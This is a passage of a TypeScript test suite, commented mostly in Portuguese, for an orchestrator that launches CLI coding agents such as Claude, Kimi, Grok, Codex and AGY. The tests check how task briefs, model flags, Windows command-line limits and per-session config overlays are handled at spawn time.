      void orchTerminateSession(sessionId);
    } finally {
      fs.rmSync(root, { recursive: true, force: true });
    }
  });

  it("F-1316: failed spawn removes its private brief", () => {
    setSquadCliPolicyLookupForTests(() => "operator-choice");
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-failed-file-brief-"));
    const base = revisionBoundWorker(fs.realpathSync.native(root));
    let briefPath: string | undefined;
    setPtyHost({ spawn: spec => {
      const pointer = spec.args.find(arg => arg.startsWith("Leia e siga integralmente o brief em "))!;
      briefPath = JSON.parse(pointer.slice("Leia e siga integralmente o brief em ".length));
      expect(fs.existsSync(briefPath!)).toBe(true);
      throw new Error("test host spawn failed");
    } });
    try {
      expect(() => spawnMainOwnedAgentSession(
        { kind: "cli-agent", paneId: "failed-large-brief", cols: 100, rows: 30 },
        builtinCliPtyAdapter("claude"), {},
        { ...base, context: { ...base.context!, initialPrompt: "contexto ".repeat(4_000) } },
      )).toThrow("test host spawn failed");
      expect(briefPath).toBeDefined();
      expect(fs.existsSync(briefPath!)).toBe(false);
    } finally {
      fs.rmSync(root, { recursive: true, force: true });
    }
  });

  (process.platform === "win32" ? it : it.skip)(
    "F-668: worker claude no Windows nasce no executável do pacote, com o brief multi-linha inteiro",
    async () => {
      // Campo 28/09 13:37: via claude.cmd o cmd.exe cortou o argumento na 1ª
      // quebra de linha e o worker recebeu só "## Nexus execution authority".
      setSquadCliPolicyLookupForTests(() => "operator-choice");
      const root = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-claude-shim-"));
      const worktree = path.join(root, "worktree");
      fs.mkdirSync(worktree);
      const host = fakeHost();
      setPtyHost(host.host);
      const base = revisionBoundWorker(fs.realpathSync.native(worktree));
      const brief =
        "## Nexus execution authority\nexecutionMode=same_checkout\nFaça a tarefa e chame nexus_handoff_submit.";
      const authority: BoundSpawnAuthority = {
        ...base,
        context: { ...base.context!, initialPrompt: brief },
      };
      npmShimSpawn.launch = { file: "/mock/pkg/claude.exe", argsPrefix: [] };
      npmShimSpawn.calls.length = 0;
      let sessionId: string | null = null;
      try {
        ({ sessionId } = spawnMainOwnedAgentSession(
          { kind: "cli-agent", paneId: "claude-npm-shim", cols: 100, rows: 30 },
          builtinCliPtyAdapter("claude"),
          {},
          authority,
        ));
        const spec = host.specFor(sessionId);
        expect(npmShimSpawn.calls).toContainEqual(["claude", "/mock/bin/claude"]);
        expect(spec.file).toBe("/mock/pkg/claude.exe");
        expect(spec.args).toContain(brief);
      } finally {
        npmShimSpawn.launch = null;
        if (sessionId) await orchTerminateSession(sessionId);
        fs.rmSync(root, { recursive: true, force: true });
      }
    },
  );

  (process.platform === "win32" ? it : it.skip)(
    "F-669: brief grande demais para a linha de comando do Windows não vai no argv",
    async () => {
      // Campo 28/09 13:5x: quatro helpers morreram com "Linha de comando muito
      // longa" — o teto de 64 KB passava dos 32.767 do CreateProcess.
      setSquadCliPolicyLookupForTests(() => "operator-choice");
      const root = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-claude-long-brief-"));
      const worktree = path.join(root, "worktree");
      fs.mkdirSync(worktree);
      const host = fakeHost();
      setPtyHost(host.host);
      const base = revisionBoundWorker(fs.realpathSync.native(worktree));
      const brief = "## Nexus execution authority\n" + "contexto ".repeat(3_000);
      const authority: BoundSpawnAuthority = {
        ...base,
        context: { ...base.context!, initialPrompt: brief },
      };
      let sessionId: string | null = null;
      try {
        ({ sessionId } = spawnMainOwnedAgentSession(
          { kind: "cli-agent", paneId: "claude-long-brief", cols: 100, rows: 30 },
          builtinCliPtyAdapter("claude"),
          {},
          authority,
        ));
        const spec = host.specFor(sessionId);
        expect(spec.args.join(" ").length).toBeLessThan(32_767);
        expect(spec.args).not.toContain(brief);
      } finally {
        if (sessionId) await orchTerminateSession(sessionId);
        fs.rmSync(root, { recursive: true, force: true });
      }
    },
  );

  (process.platform === "win32" ? it : it.skip)(
    "F-670: launcher .cmd não verificado nunca leva o brief — ele é colado depois do boot",
    async () => {
      setSquadCliPolicyLookupForTests(() => "operator-choice");
      const root = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-cmd-deferred-"));
      const worktree = path.join(root, "worktree");
      fs.mkdirSync(worktree);
      const host = fakeHost();
      setPtyHost(host.host);
      const base = revisionBoundWorker(fs.realpathSync.native(worktree));
      const brief = "## Nexus execution authority\nexecutionMode=same_checkout\nUse %PATH% com cuidado.";
      const authority: BoundSpawnAuthority = {
        ...base,
        context: { ...base.context!, initialPrompt: brief },
      };
      const deferred: Array<{ sessionId: string; prompt: string; reason: string }> = [];
      setDeferredInitialPromptHook((info) => deferred.push(info));
      npmShimSpawn.launch = null;
      let sessionId: string | null = null;
      try {
        ({ sessionId } = spawnMainOwnedAgentSession(
          { kind: "cli-agent", paneId: "claude-cmd-deferred", cols: 100, rows: 30 },
          builtinCliPtyAdapter("claude"),
          { binPath: "/mock/bin/claude.cmd" },
          authority,
        ));
        await new Promise((resolve) => setTimeout(resolve, 0));
        const spec = host.specFor(sessionId);
        expect(spec.file).toBe("/mock/bin/claude.cmd");
        expect(spec.args).not.toContain(brief);
        expect(deferred).toEqual([
          { sessionId, adapterId: "claude", prompt: brief, reason: "batch-launcher" },
        ]);
      } finally {
        setDeferredInitialPromptHook(null);
        if (sessionId) await orchTerminateSession(sessionId);
        fs.rmSync(root, { recursive: true, force: true });
      }
    },
  );

  (process.platform === "win32" ? it : it.skip)(
    "F-671: linha de comando inteira acima do limite tira o brief do argv",
    async () => {
      setSquadCliPolicyLookupForTests(() => "operator-choice");
      const root = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-long-line-"));
      const worktree = path.join(root, "worktree");
      fs.mkdirSync(worktree);
      const host = fakeHost();
      setPtyHost(host.host);
      const base = revisionBoundWorker(fs.realpathSync.native(worktree));
      // F-1316: o brief agora vira ponteiro; a config sozinha estoura 32K.
      const brief = "## Nexus execution authority\n" + "a".repeat(19_000);
      const authority: BoundSpawnAuthority = {
        ...base,
        context: { ...base.context!, initialPrompt: brief },
      };
      const deferred: Array<{ reason: string }> = [];
      setDeferredInitialPromptHook((info) => deferred.push(info));
      npmShimSpawn.launch = { file: "/mock/pkg/claude.exe", argsPrefix: [] };
      let sessionId: string | null = null;
      try {
        ({ sessionId } = spawnMainOwnedAgentSession(
          { kind: "cli-agent", paneId: "claude-long-line", cols: 100, rows: 30 },
          builtinCliPtyAdapter("claude"),
          { extraArgs: ["--append-system-prompt", "b".repeat(34_000)] },
          authority,
        ));
        await new Promise((resolve) => setTimeout(resolve, 0));
        const spec = host.specFor(sessionId);
        expect(spec.args).not.toContain(brief);
        expect(deferred.map((entry) => entry.reason)).toEqual(["command-line-too-long"]);
      } finally {
        npmShimSpawn.launch = null;
        setDeferredInitialPromptHook(null);
        if (sessionId) await orchTerminateSession(sessionId);
        fs.rmSync(root, { recursive: true, force: true });
      }
    },
  );

  it("kimi: alias fora do config.toml não vai no --model (o CLI recusa a sessão inteira)", async () => {
    // Smoke 28/09: a preferência antiga "kimi-k2.7" ia no --model e o Kimi Code
    // 2.1.1 abria com "Model kimi-k2.7 is not configured in config.toml", sem
    // sessão e sem briefing. Só alias declarado em [models."…"] pode viajar.
    setSquadCliPolicyLookupForTests(() => "operator-choice");
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-kimi-alias-"));
    const kimiHome = path.join(root, "kimi-home");
    fs.mkdirSync(kimiHome);
    const savedHome = process.env.KIMI_CODE_HOME;
    process.env.KIMI_CODE_HOME = kimiHome;
    const h = fakeHost();
    const spawn = vi.spyOn(h.host, "spawn");
    setPtyHost(h.host);
    const adapter = builtinCliPtyAdapter("kimi");
    const opened: string[] = [];
    const argsFor = (paneId: string, model: string): string[] => {
      const { sessionId } = spawnAgentSession(
        fakeWc(),
        { kind: "cli-agent", paneId, cols: 80, rows: 24, model },
        adapter,
        {},
        trustedSpawn(fs.realpathSync(root)),
      );
      opened.push(sessionId);
      return spawn.mock.calls.at(-1)![0].args;
    };
    try {
      // Config declara o alias "K2.7 Coding": a preferência antiga migra para ele.
      fs.writeFileSync(
        path.join(kimiHome, "config.toml"),
        '[models."kimi-code/k3"]\n[models."kimi-code/kimi-for-coding"]\n',
      );
      const migrated = argsFor("kimi-alias-1", "kimi-k2.7");
      expect(migrated[migrated.indexOf("--model") + 1]).toBe("kimi-code/kimi-for-coding");
      // Config sem o alias: sem --model, o Kimi usa o default_model em vez de morrer.
      fs.writeFileSync(path.join(kimiHome, "config.toml"), '[models."kimi-code/k3"]\n');
      expect(argsFor("kimi-alias-2", "kimi-k2.7")).not.toContain("--model");
      // Alias declarado passa intacto.
      const declared = argsFor("kimi-alias-3", "kimi-code/k3");
      expect(declared[declared.indexOf("--model") + 1]).toBe("kimi-code/k3");
      // Perfil do PANE (conta escolhida em keyEnv.KIMI_CODE_HOME) manda sobre o do Main (Astra P2-6).
      const paneHome = path.join(root, "pane-home");
      fs.mkdirSync(paneHome);
      fs.writeFileSync(path.join(paneHome, "config.toml"), '[models."kimi-code/kimi-for-coding"]\n');
      const { sessionId: paneSession } = spawnAgentSession(
        fakeWc(),
        { kind: "cli-agent", paneId: "kimi-alias-4", cols: 80, rows: 24, model: "kimi-k2.7" },
        adapter,
        { keyEnv: { KIMI_CODE_HOME: paneHome } },
        trustedSpawn(fs.realpathSync(root)),
      );
      opened.push(paneSession);
      const fromPane = spawn.mock.calls.at(-1)![0].args;
      expect(fromPane[fromPane.indexOf("--model") + 1]).toBe("kimi-code/kimi-for-coding");
      // Canal transient (chave de API): o modelo vai por env, não por --model; a guarda não se aplica (Astra P1-3).
      const { sessionId: apiSession } = spawnAgentSession(
        fakeWc(),
        { kind: "cli-agent", paneId: "kimi-alias-5", cols: 80, rows: 24, model: "kimi-code/kimi-for-coding" },
        adapter,
        { keyEnv: { KIMI_MODEL_API_KEY: "sk-kimi", KIMI_MODEL_NAME: "kimi-for-coding" } },
        trustedSpawn(fs.realpathSync(root)),
      );
      opened.push(apiSession);
      const viaApi = spawn.mock.calls.at(-1)![0];
      expect(viaApi.args).not.toContain("--model");
      expect(viaApi.env.KIMI_MODEL_NAME).toBe("kimi-for-coding");
    } finally {
      if (savedHome === undefined) delete process.env.KIMI_CODE_HOME;
      else process.env.KIMI_CODE_HOME = savedHome;
      for (const sessionId of opened) await orchTerminateSession(sessionId);
      fs.rmSync(root, { recursive: true, force: true });
    }
  });

  it("não injeta prompt no argv do claude ao RETOMAR uma sessão", async () => {
    setSquadCliPolicyLookupForTests(() => "operator-choice");
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-claude-resume-"));
    const worktree = path.join(root, "worktree");
    fs.mkdirSync(worktree);
    const host = fakeHost();
    setPtyHost(host.host);
    const baseAuthority = revisionBoundWorker(fs.realpathSync.native(worktree));
    const initialPrompt = "não pode reaparecer numa retomada";
    const authority: BoundSpawnAuthority = {
      ...baseAuthority,
      context: { ...baseAuthority.context!, initialPrompt },
    };
    let sessionId: string | null = null;
    try {
      ({ sessionId } = spawnMainOwnedAgentSession(
        {
          kind: "cli-agent",
          paneId: "claude-argv-resume",
          cols: 100,
          rows: 30,
          resume: true,
        },
        builtinCliPtyAdapter("claude"),
        {},
        authority,
      ));
      const spec = host.specFor(sessionId);
      expect(spec.args).not.toContain(initialPrompt);
    } finally {
      if (sessionId) await orchTerminateSession(sessionId);
      fs.rmSync(root, { recursive: true, force: true });
    }
  });

  it("entrega o prompt no argv de um adapter DeepSeek que roda o binário claude", async () => {
    setSquadCliPolicyLookupForTests(() => "operator-choice");
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-deepseek-argv-"));
    const worktree = path.join(root, "worktree");
    fs.mkdirSync(worktree);
    const host = fakeHost();
    setPtyHost(host.host);
    const baseAuthority = revisionBoundWorker(fs.realpathSync.native(worktree));
    const initialPrompt = "Implemente com deepseek-v4-pro e entregue o handoff.";
    const authority: BoundSpawnAuthority = {
      ...baseAuthority,
      context: { ...baseAuthority.context!, initialPrompt },
    };
    const adapter: CliPtyAdapter = {
      ...makeAdapter({ static: {}, passthrough: [], ephemeralHome: false }),
      id: "deepseek",
      bin: "claude",
      label: "DeepSeek",
      spawn: {
        ...makeAdapter({ static: {}, passthrough: [], ephemeralHome: false }).spawn,
        interactive: ["claude", "--model", "{{MODEL}}"],
      },
      models: {
        flag: "--model",
        list: ["deepseek-v4-flash", "deepseek-v4-pro"],
        default: "deepseek-v4-flash",
      },
    };
    let sessionId: string | null = null;
    try {
      ({ sessionId } = spawnMainOwnedAgentSession(
        {
          kind: "cli-agent",
          paneId: "deepseek-argv-birth",
          cols: 100,
          rows: 30,
          model: "deepseek-v4-pro",
        },
        adapter,
        {},
        authority,
      ));
      const spec = host.specFor(sessionId);
      expect(spec.args.filter((a) => a === initialPrompt)).toHaveLength(1);
      expect(spec.args).toEqual(
        expect.arrayContaining(["--model", "deepseek-v4-pro"]),
      );
      expect(spec.args).not.toContain("deepseek-v4-flash");
    } finally {
      if (sessionId) await orchTerminateSession(sessionId);
      fs.rmSync(root, { recursive: true, force: true });
    }
  });

  it("F-724: no Token Plan o --model deepseek-flash selado sobe como deepseek-v4-pro", async () => {
    setSquadCliPolicyLookupForTests(() => "operator-choice");
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-deepseek-plan-"));
    const worktree = path.join(root, "worktree");
    fs.mkdirSync(worktree);
    const host = fakeHost();
    setPtyHost(host.host);
    // Worker de missão: modelo selado — a trava argvHonorsModel confere o
    // modelo SERVIDO, não recusa o spawn.
    const authority = revisionBoundWorker(fs.realpathSync.native(worktree));
    const adapter: CliPtyAdapter = {
      ...makeAdapter({ static: {}, passthrough: [], ephemeralHome: false }),
      id: "deepseek",
      bin: "claude",
      label: "DeepSeek",
      spawn: {
        ...makeAdapter({ static: {}, passthrough: [], ephemeralHome: false }).spawn,
        interactive: ["claude", "--model", "{{MODEL}}"],
      },
      models: {
        flag: "--model",
        list: ["deepseek-v4-pro", "deepseek-flash"],
        default: "deepseek-v4-pro",
      },
    };
    const opened: string[] = [];
    try {
      const plan = spawnMainOwnedAgentSession(
        { kind: "cli-agent", paneId: "deepseek-plan-flash", cols: 100, rows: 30, model: "deepseek-flash" },
        adapter,
        { modelAliases: { "deepseek-flash": "deepseek-v4-pro", "deepseek-v4-flash": "deepseek-v4-pro" } },
        authority,
      );
      opened.push(plan.sessionId);
      const planArgs = host.specFor(plan.sessionId).args;
      expect(planArgs).toEqual(expect.arrayContaining(["--model", "deepseek-v4-pro"]));
      expect(planArgs).not.toContain("deepseek-flash");
      // Sem alias (API direta) o flash continua flash.
      const direct = spawnMainOwnedAgentSession(
        { kind: "cli-agent", paneId: "deepseek-direct-flash", cols: 100, rows: 30, model: "deepseek-flash" },
        adapter,
        {},
        authority,
      );
      opened.push(direct.sessionId);
      expect(host.specFor(direct.sessionId).args).toEqual(
        expect.arrayContaining(["--model", "deepseek-flash"]),
      );
    } finally {
      for (const sessionId of opened) await orchTerminateSession(sessionId);
      fs.rmSync(root, { recursive: true, force: true });
    }
  });

  it.each(['fresh', 'fresh-large', 'no-argv', 'resume', 'paste', 'direct-user'] as const)(
    'F-1139 arms only the actual final fresh argv launch (%s)', async mode => {
      setSquadCliPolicyLookupForTests(() => "operator-choice");
      const root = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-argv-proof-"));
      const worktree = path.join(root, "worktree"); fs.mkdirSync(worktree);
      const host = fakeHost(); setPtyHost(host.host);
      const base = revisionBoundWorker(fs.realpathSync.native(worktree));
      const prompt = mode === 'fresh-large' ? 'large native argv '.repeat(2_000) : 'exact sanitized native argv';
      const authority = mode === 'direct-user' ? trustedSpawn(fs.realpathSync.native(worktree)) : {
        ...base, context: { ...base.context!, ...(mode === 'no-argv' ? {} : { initialPrompt: prompt }) },
      };
      const builtin = builtinCliPtyAdapter('grok');
      const adapter = mode === 'paste' ? { ...builtin, spawn: { ...builtin.spawn, initialPrompt: 'paste' as const } } : builtin;
      let ctx: ReturnType<typeof mintToken> | undefined;
      let sid: string | undefined;
      setAgentSpawnHook((_adapter, _request, actual) => {
        ctx = mintToken({ label: 'private argv birth', role: actual.context?.role ?? 'user',
          missionId: actual.context?.missionId, workerIncarnationId: actual.context?.workerIncarnationId,
          scope: actual.coordinationScope ?? actual.scope, allowedTools: [], allowedSkills: [] });
        return { authorityToken: ctx.token, env: { NEXUS_GATE_TOKEN: ctx.token }, extraArgs: [],
          onSpawned: sessionId => bindTokenToSession(ctx!.token, sessionId) };
      });
      try {
        sid = spawnAgentSession(mode === 'direct-user' ? fakeWc() : null, { kind: 'cli-agent', paneId: 'argv-proof', cols: 100, rows: 30,
          ...(mode === 'resume' ? { resume: true } : {}) }, adapter, {}, authority).sessionId;
        expect(host.specFor(sid).args.includes(prompt)).toBe(mode === 'fresh');
        const submitted = mode === 'fresh-large'
          ? host.specFor(sid).args.find(arg => arg.startsWith('Leia e siga integralmente o brief em '))!
          : prompt;
        recordAuthenticatedNativeArgvSubmission(sid, submitted);
        publishSessionActivityState(sid, 'idle'); // Completion does not erase the exact launch proof.
        expect(hasAcceptedNativeArgvPrompt(sid, prompt, 'grok')).toBe(mode === 'fresh' || mode === 'fresh-large');
        expect(hasAcceptedNativeArgvPrompt(sid, 'later paste', 'grok')).toBe(false);
        // Loss of the exact authenticated bearer never makes a receipt current.
        releaseSession(sid);
        expect(hasAcceptedNativeArgvPrompt(sid, prompt, 'grok')).toBe(false);
        await orchTerminateSession(sid);
        expect(hasAcceptedNativeArgvPrompt(sid, prompt, 'grok')).toBe(false);
      } finally {
        if (sid) await orchTerminateSession(sid);
        if (ctx) cleanupCliMcpSession(ctx.token);
        setAgentSpawnHook(null); resetGateForTests(); fs.rmSync(root, { recursive: true, force: true });
      }
    });

  it("entrega o prompt posicional no argv do grok — sem allowlist de ids", async () => {
    setSquadCliPolicyLookupForTests(() => "operator-choice");
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-grok-argv-"));
    const worktree = path.join(root, "worktree");
    fs.mkdirSync(worktree);
    const host = fakeHost();
    setPtyHost(host.host);
    const baseAuthority = revisionBoundWorker(fs.realpathSync.native(worktree));
    const initialPrompt = "Implemente no grok e chame nexus_handoff_submit.";
    const authority: BoundSpawnAuthority = {
      ...baseAuthority,
      context: { ...baseAuthority.context!, initialPrompt },
    };
    let sessionId: string | null = null;
    try {
      ({ sessionId } = spawnMainOwnedAgentSession(
        {
          kind: "cli-agent",
          paneId: "grok-argv-birth",
          cols: 100,
          rows: 30,
          model: "grok-4.5",
        },
        builtinCliPtyAdapter("grok"),
        {},
        authority,
      ));
      const spec = host.specFor(sessionId);
      expect(spec.args.filter((a) => a === initialPrompt)).toHaveLength(1);
      expect(spec.args).toEqual(
        expect.arrayContaining(["--model", "grok-4.5"]),
      );
    } finally {
      if (sessionId) await orchTerminateSession(sessionId);
      fs.rmSync(root, { recursive: true, force: true });
    }
  });

  it("passa gpt-5.6-sol no argv do Codex — nunca omite a flag para o default 5.5", async () => {
    setSquadCliPolicyLookupForTests(() => "operator-choice");
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-codex-sol-"));
    const worktree = path.join(root, "worktree");
    fs.mkdirSync(worktree);
    const host = fakeHost();
    setPtyHost(host.host);
    const baseAuthority = revisionBoundWorker(fs.realpathSync.native(worktree));
    const authority: BoundSpawnAuthority = {
      ...baseAuthority,
      context: {
        ...baseAuthority.context!,
        initialPrompt: "Implemente com Sol e entregue o handoff.",
      },
    };
    let sessionId: string | null = null;
    try {
      ({ sessionId } = spawnMainOwnedAgentSession(
        {
          kind: "cli-agent",
          paneId: "codex-sol-birth",
          cols: 100,
          rows: 30,
          model: "gpt-5.6-sol",
        },
        builtinCliPtyAdapter("codex"),
        {},
        authority,
      ));
      const spec = host.specFor(sessionId);
      expect(spec.args).toEqual(
        expect.arrayContaining(["--model", "gpt-5.6-sol"]),
      );
      expect(spec.args).not.toContain("gpt-5.5");
    } finally {
      if (sessionId) await orchTerminateSession(sessionId);
      fs.rmSync(root, { recursive: true, force: true });
    }
  });

  it("recusa spawn quando o modelo selado não tem flag no adapter", async () => {
    setSquadCliPolicyLookupForTests(() => "operator-choice");
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-sealed-model-"));
    const worktree = path.join(root, "worktree");
    fs.mkdirSync(worktree);
    const host = fakeHost();
    setPtyHost(host.host);
    const adapter: CliPtyAdapter = {
      ...makeAdapter({ static: {}, passthrough: [], ephemeralHome: false }),
      models: { flag: "", list: ["sealed-model"], default: "default" },
    };
    expect(() =>
      spawnMainOwnedAgentSession(
        {
          kind: "cli-agent",
          paneId: "sealed-model-missing-flag",
          cols: 100,
          rows: 30,
          model: "sealed-model",
        },
        adapter,
        {},
        revisionBoundWorker(fs.realpathSync.native(worktree)),
      ),
    ).toThrow(/modelo selado "sealed-model"/);
    fs.rmSync(root, { recursive: true, force: true });
  });

  it("does not pass a worker initial prompt to an AGY orchestrator", async () => {
    setSquadCliPolicyLookupForTests(() => "operator-choice");
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-agy-maestro-"));
    const worktree = path.join(root, "worktree");
    fs.mkdirSync(worktree);
    const baseAuthority = revisionBoundWorker(
      fs.realpathSync.native(worktree),
    );
    const authority: BoundSpawnAuthority = {
      ...baseAuthority,
      context: {
        ...baseAuthority.context!,
        role: "orchestrator",
        initialPrompt: "must not reach argv",
      },
    };
    const host = fakeHost();
    setPtyHost(host.host);
    let sessionId: string | null = null;

    try {
      ({ sessionId } = spawnMainOwnedAgentSession(
        {
          kind: "cli-agent",
          paneId: "agy-orchestrator",
          cols: 100,
          rows: 30,
        },
        builtinCliPtyAdapter("agy"),
        { keyEnv: { GEMINI_CLI_HOME: completedAgyFixtureHome(root) } },
        authority,
      ));

      const spec = host.specFor(sessionId);
      expect(spec.args).not.toContain("--prompt-interactive");
      expect(spec.args).not.toContain("--print");
      expect(spec.args).not.toContain("must not reach argv");
      // Orquestrador AGY cola o briefing: continua lendo o terminal. F-1476:
      // a flag interativa do AGY é só do worker — a Via Rápida e o tool-util
      // colam o brief do Maestro, e argv + colagem seriam dois briefs.
      expect(getAgentSessionInfo(sessionId)?.oneShot).toBeUndefined();
    } finally {
      if (sessionId) await orchTerminateSession(sessionId);
      fs.rmSync(root, { recursive: true, force: true });
    }
  });

  it("F-1476: worker AGY nasce com --prompt-interactive <brief>, sem --print, e não é one-shot", async () => {
    // O `agy --print` bufferiza a resposta: o pane ficava preto (só o cursor)
    // até o fim da tarefa. `--prompt-interactive` roda o mesmo primeiro turno
    // na TUI, ao vivo. Sem `--print` não há one-shot (F-662/F-1272 seguem
    // valendo para quem ainda é, como o OpenCode `run`).
    setSquadCliPolicyLookupForTests(() => "operator-choice");
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-agy-live-"));
    const worktree = path.join(root, "worktree");
    fs.mkdirSync(worktree);
    const baseAuthority = revisionBoundWorker(fs.realpathSync.native(worktree));
    const authority: BoundSpawnAuthority = {
      ...baseAuthority,
      context: { ...baseAuthority.context!, initialPrompt: "Revise e entregue." },
    };
    const host = fakeHost();
    setPtyHost(host.host);
    let sessionId: string | null = null;
    try {
      ({ sessionId } = spawnMainOwnedAgentSession(
        { kind: "cli-agent", paneId: "agy-live-worker", cols: 100, rows: 30 },
        builtinCliPtyAdapter("agy"),
        { keyEnv: { GEMINI_CLI_HOME: completedAgyFixtureHome(root) } },
        authority,
      ));
      const args = host.specFor(sessionId).args;
      expect(args.filter((arg) => arg === "--prompt-interactive")).toHaveLength(1);
      expect(args[args.indexOf("--prompt-interactive") + 1]).toBe("Revise e entregue.");
      // `--prompt` é ALIAS de `--print` no agy 1.3.4 — nenhum dos dois.
      expect(args).not.toContain("--print");
      expect(args).not.toContain("--prompt");
      expect(getAgentSessionInfo(sessionId)).toMatchObject({ adapterId: "agy" });
      expect(getAgentSessionInfo(sessionId)?.oneShot).toBeUndefined();
    } finally {
      if (sessionId) await orchTerminateSession(sessionId);
      fs.rmSync(root, { recursive: true, force: true });
    }
  });

  macosIt(
    "uses OpenCode headless run for a main-owned mission worker initial prompt",
    async () => {
      setSquadCliPolicyLookupForTests(() => "operator-choice");
      const root = fs.mkdtempSync(
        path.join(os.tmpdir(), "nexus-opencode-headless-worker-"),
      );
      const worktree = path.join(root, "worktree");
      fs.mkdirSync(worktree);
      const baseAuthority = revisionBoundWorker(
        fs.realpathSync.native(worktree),
      );
      const initialPrompt =
        "Revise o projeto e chame nexus_handoff_submit ao concluir.";
      const authority: BoundSpawnAuthority = {
        ...baseAuthority,
        context: {
          ...baseAuthority.context!,
          readOnly: true,
          nativeReadOnly: false,
          initialPrompt,
        },
      };
      const host = fakeHost();
      setPtyHost(host.host);
      let sessionId: string | null = null;

      try {
        ({ sessionId } = spawnMainOwnedAgentSession(
          {
            kind: "cli-agent",
            paneId: "opencode-headless-worker",
            cols: 100,
            rows: 30,
            model: "opencode/big-pickle",
          },
          builtinCliPtyAdapter("opencode"),
          {},
          authority,
        ));

        const spec = host.specFor(sessionId);
        expect(spec.file).toBe("/mock/bin/opencode");
        expect(spec.args[0]).toBe("run");
        expect(spec.args).toEqual(
          expect.arrayContaining([
            "--model",
            "opencode/big-pickle",
            "--auto",
            initialPrompt,
          ]),
        );
        expect(spec.args.filter((arg) => arg === initialPrompt)).toHaveLength(1);
        expect(spec.args).not.toContain("--mini");
      } finally {
        if (sessionId) await orchTerminateSession(sessionId);
        fs.rmSync(root, { recursive: true, force: true });
      }
    },
  );
});

describe('F-1643/F-1644 startup reaches the real Codex overlay', () => {
  const scenarios: Array<{
    label: string; version: string | null; model: string; resume: boolean;
    args: string[]; optIn: boolean; wantDaybreak: boolean | undefined; wantTrust: boolean;
    effort?: string; providerArgs?: string[];
  }> = [
    { label: 'ordinary new session', version: '0.163.0', model: 'gpt-6.1-sol', resume: false, args: [] as string[], optIn: false, wantDaybreak: false, wantTrust: true },
    { label: 'unknown version', version: null, model: 'gpt-6.1-sol', resume: false, args: [] as string[], optIn: false, wantDaybreak: undefined, wantTrust: true },
    { label: 'selected Daybreak model', version: '0.163.0', model: 'gpt-daybreak-blue-latest', resume: false, args: [] as string[], optIn: false, wantDaybreak: undefined, wantTrust: true },
    { label: 'explicit profile', version: '0.163.0', model: 'gpt-6.1-sol', resume: false, args: ['--profile', 'operator-profile'], optIn: false, wantDaybreak: undefined, wantTrust: false },
    { label: 'resume request', version: '0.163.0', model: 'gpt-6.1-sol', resume: true, args: [] as string[], optIn: false, wantDaybreak: undefined, wantTrust: true },
    { label: 'explicit native opt-in', version: '0.163.0', model: 'gpt-6.1-sol', resume: false, args: [] as string[], optIn: true, wantDaybreak: true, wantTrust: true },
    { label: 'generated high effort', version: '0.163.0', model: 'gpt-6.1-sol', resume: false, args: [], optIn: false, wantDaybreak: false, wantTrust: true, effort: 'high' },
    { label: 'explicit provider config override after controls', version: '0.163.0', model: 'gpt-6.1-sol', resume: false, args: [], optIn: false, wantDaybreak: undefined, wantTrust: false, providerArgs: ['-c', 'daybreak=true'] },
  ];
  it.each(scenarios)('$label', async scenario => {
    setSquadCliPolicyLookupForTests(() => 'operator-choice');
    const root = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'nexus-codex-startup-')));
    // Keep the project below the fixture HOME: a real host ancestor's
    // .codex/config.toml must not become this test's project-level input.
    const cwd = path.join(root, 'home', 'project');
    fs.mkdirSync(cwd, { recursive: true });
    const cleanupHook = installGovernedCodexTestHook(root, undefined, {
      projectTrust: { cwdRealPath: cwd, workspaceRootRealPath: cwd, basis: 'opened-workspace' },
      daybreak: 'suppress-unrequested',
    });
    const nativeHome = path.join(root, 'home', '.codex');
    fs.mkdirSync(nativeHome, { recursive: true });
    const nativeConfig = '[features]\njs_repl = true\n' + (scenario.optIn ? 'cli_daybreak = true\n' : '');
    fs.writeFileSync(path.join(nativeHome, 'config.toml'), nativeConfig);
    cliVersions.set('/mock/bin/codex', scenario.version);
    const host = fakeHost();
    setPtyHost(host.host);
    const adapter = makeCodexAdapter();
    adapter.spawn.extraArgs = [...adapter.spawn.extraArgs, ...scenario.args];
    // The actual provider preparation prepends these Main-generated controls,
    // including -c model_reasoning_effort=medium even with no explicit choice.
    const generatedControlArgs = buildControlArgs(adapter, { effort: scenario.effort });
    let sessionId: string | undefined;
    try {
      const spawned = spawnAgentSession(fakeWc(), {
        kind: 'cli-agent', cols: 80, rows: 24, model: scenario.model, resume: scenario.resume,
      }, adapter, {
        extraArgs: [...generatedControlArgs, ...(scenario.providerArgs ?? [])],
        generatedControlArgs,
      }, trustedSpawn(cwd));
      sessionId = spawned.sessionId;
      const effective = host.specFor(sessionId).env.CODEX_HOME!;
      const config = parse(fs.readFileSync(path.join(effective, 'config.toml'), 'utf8')) as {
        features?: Record<string, unknown>; projects?: Record<string, { trust_level?: string }>;
      };
      expect(config.features?.cli_daybreak).toBe(scenario.wantDaybreak);
      expect(config.features?.js_repl).toBe(true);
      expect(config.projects?.[cwd]?.trust_level).toBe(scenario.wantTrust ? 'trusted' : undefined);
      expect(fs.readFileSync(path.join(nativeHome, 'config.toml'), 'utf8')).toBe(nativeConfig);
    } finally {
      if (sessionId) await orchTerminateSession(sessionId);
      cleanupHook();
      expect(fs.readFileSync(path.join(nativeHome, 'config.toml'), 'utf8')).toBe(nativeConfig);
      fs.rmSync(root, { recursive: true, force: true });
    }
  });
});

describe("entrega física das skills concedidas ao Codex", () => {
  function seedSourceSkills(home: string): void {
    for (const name of ["granted-skill", "ungranted-skill"]) {
      const dir = path.join(home, ".claude", "skills", name);
      fs.mkdirSync(dir, { recursive: true });
      fs.writeFileSync(
        path.join(dir, "SKILL.md"),
        `---\nname: ${name}\ndescription: fixture\n---\n`,
      );
    }
  }

  function workerWithSkills(
